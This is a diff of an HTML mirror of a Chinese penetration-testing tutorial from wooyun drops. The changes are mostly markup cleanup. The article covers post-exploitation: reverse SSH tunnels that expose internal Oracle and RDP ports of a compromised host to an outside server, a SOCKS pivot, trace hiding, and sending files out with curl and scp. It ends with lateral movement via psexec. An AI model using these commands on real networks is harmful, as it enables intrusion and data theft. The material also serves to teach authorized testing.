@@ -3,14 +3,14 @@
 			<head>
 			     <title>各种环境下的渗透测试 - insight-labs</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/411">http://drops.wooyun.org/tips/411</a></h1>
 				
       <p>
-        <h3>getshell:</h3>
+        </p><h3>getshell:</h3>
 
-<hr />
+<hr>
 
 <p>找到切入点后，首先是要弹个shell，一般我用<a href="http://static.wooyun.org/20141017/2014101711593519930.zip">back.py</a></p>
 
@@ -22,7 +22,7 @@
 
 <h3>ssh各种姿势</h3>
 
-<hr />
+<hr>
 
 <p>反弹内网端口：</p>
 
@@ -45,14 +45,14 @@
 
 <p>开始转发：</p>
 
-<pre><code>ssh -fNR 要反弹到的端口:目标本机或者内外ip:要反弹的目标端口 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7890c5d49df7e99cc0eb9fecd09fecd09ef0cf9de8f5389cc5d89fe2fc0b0b109ee4f59df2d99de1d01108">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> 执行后会问你转发用户名的密码，输入成功后会自动切换到后台
+<pre><code>ssh -fNR 要反弹到的端口:目标本机或者内外ip:要反弹的目标端口 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7890c5d49df7e99cc0eb9fecd09fecd09ef0cf9de8f5389cc5d89fe2fc0b0b109ee4f59df2d99de1d01108">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> 执行后会问你转发用户名的密码，输入成功后会自动切换到后台
 </code></pre>
 
 <p>例子1：</p>
 
 <p>本地转发： 目标机器上有个oracle端口在1521，但是只能从内网访问。提权提不上，没装sqlplus等工具，webshell数据库管理各种出错，不过翻到了登录用户名和密码。不过我自己的机器上装了个navicat for oracle⋯⋯ ssh服务器上的端口转发用户名叫forward，服务器ip是123.123.123.123</p>
 
-<pre><code>ssh -fNR 11521:127.0.0.1:1521 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="11777e6366706375512023223f2023223f2023223f202322">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+<pre><code>ssh -fNR 11521:127.0.0.1:1521 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="11777e6366706375512023223f2023223f2023223f202322">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
 </code></pre>
 
 <p>注意：之所以开到11521端口是因为&lt;1024的端口需要root权限才能占用，另外注意你反弹到服务器的端口不能被iptables之类的挡住，不然你没法从外网访问(废话么)</p>
@@ -63,7 +63,7 @@
 
 <p>内网ip转发： 除了能转发localhost，还能转发内网其他ip的端口，甚至在不同网段都行，只要能从内网的已沦陷机器访问到就行。比如内网有个windows服务器，ip 192.168.5.10, 开了3389端口，不过也只能在内网访问⋯⋯</p>
 
-<pre><code>ssh -fNR 13389:192.168.5.10:3389 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="563039242137243216676465786764657867646578676465">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+<pre><code>ssh -fNR 13389:192.168.5.10:3389 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="563039242137243216676465786764657867646578676465">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
 </code></pre>
 
 <p>反弹成功后mstsc连123.123.123.123:13389即可⋯⋯</p>
@@ -88,19 +88,19 @@
 
 <p>姿势：</p>
 
-<pre><code>ssh -fND 127.0.0.1:8080 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="473234223507767570697769776976">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+<pre><code>ssh -fND 127.0.0.1:8080 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="473234223507767570697769776976">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
 </code></pre>
 
 <p>这样会在本地8080端口开socks5代理，然后反弹</p>
 
-<pre><code>ssh -fNR 18080:127.0.0.1:8080 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3a5c55484d5b485e7a0b0809140b0809140b0809140b0809">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+<pre><code>ssh -fNR 18080:127.0.0.1:8080 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3a5c55484d5b485e7a0b0809140b0809140b0809140b0809">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
 </code></pre>
 
 <p>这样可以把socks5代理弹到123.123.123.123的18080端口，可以用proxychains和其他支持socks5代理的工具最大限度的窥探内网</p>
 
 <h3>Linux下隐藏痕迹</h3>
 
-<hr />
+<hr>
 
 <p>通过其他方式得到shell的话，需要去掉histfile等环境变量：</p>
 
@@ -168,7 +168,7 @@
 
 <h3>文件传送：</h3>
 
-<hr />
+<hr>
 
 <p>找到需要的东西后，怎么往外发也是个问题，一般大文件用ftp，scp,小文件用nc。</p>
 
@@ -176,14 +176,14 @@
 
 <p>如果目标装了curl的话就很简单了</p>
 
-<pre><code>curl -v -T 文件名 ftp://username:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1a6a7b69696d75687e5a7c6e6a736a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+<pre><code>curl -v -T 文件名 ftp://username:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1a6a7b69696d75687e5a7c6e6a736a">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
 </code></pre>
 
 <p>scp方法:</p>
 
 <p>适合有ids之类东西的地方，可以把sshd开到443等传统加密流量的接口，scp帐号需要有写入和执行shell的权限</p>
 
-<pre><code>scp backup.tgz <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fc898f998ebccdcecfd2cdcecfd2cdcecfd2cdcecf">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/tmp/backup.tgz
+<pre><code>scp backup.tgz <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fc898f998ebccdcecfd2cdcecfd2cdcecfd2cdcecf">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/tmp/backup.tgz
 </code></pre>
 
 <p>nc方法:</p>
@@ -202,7 +202,7 @@
 
 <h3>从linux到windows</h3>
 
-<hr />
+<hr>
 
 <p>有些时候你拿了linux服务器的shell，想跨到windows的机器上，基本就是通过两个手段，一个是针对windows的服务进行exploit溢出，还有就是利用在linux上搜集的用户名和密码然后通过psexec放shell。</p>
 
@@ -210,7 +210,7 @@
 
 <p>psexec：</p>
 
-<p>有几种选择，metasploit里面auxiliary里面的psexec模块，可以直接放个msf的reverse paylaod上去。另外可以把windows的服务器的445端口反弹出来，再找个windows的机器用psexec。还有就是直接在内网的linux机器上用python的psexec，<a href="https://code.google.com/p/impacket/">https://code.google.com/p/impacket/</a></p>      </p>
+<p>有几种选择，metasploit里面auxiliary里面的psexec模块，可以直接放个msf的reverse paylaod上去。另外可以把windows的服务器的445端口反弹出来，再找个windows的机器用psexec。还有就是直接在内网的linux机器上用python的psexec，<a href="https://code.google.com/p/impacket/">https://code.google.com/p/impacket/</a></p>      <p></p>
     
 			</body>
 		</html>
